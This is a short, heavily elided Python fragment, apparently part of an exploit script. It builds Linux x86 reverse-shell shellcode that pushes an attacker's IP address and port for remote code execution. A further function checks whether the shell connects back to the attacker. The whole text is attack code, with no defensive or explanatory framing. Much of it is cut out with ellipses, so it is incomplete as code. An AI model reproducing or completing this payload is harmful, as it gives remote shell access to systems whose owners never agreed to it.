...
def generate_payload(ip, port, username):
    ...
    # Linux x86 shellcode template (RCE via reverse shell)
    shellcode = (
        ...
        "\x5b"              # pop %ebx
        "\x68" + ip_hex     # push attacker's IP (e.g., \xc0\xa8\x01\x58)
        "\x66\x68" + port_hex  # push attacker's port (e.g., \x7a\x69)
...
def validate_delivery(target_ip, target_port, attacker_ip, attacker_port):
    try:
        # Check if reverse shell connects back
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
